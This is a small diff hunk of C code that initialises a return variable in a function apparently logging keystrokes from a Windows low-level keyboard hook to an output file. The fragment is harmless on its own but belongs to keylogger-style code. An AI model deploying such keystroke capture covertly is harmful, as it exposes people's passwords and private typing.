@@ -13,7 +13,7 @@ DWORD log_kbd(const KBDLLHOOKSTRUCT *const kbd_hook)
 
 	static HANDLE out_file = NULL;
 
-	DWORD rc;
+	DWORD rc = 0;
 
 	if (!out_file) {
 		rc = open_utf16_file(&out_file, OUT_FILE);
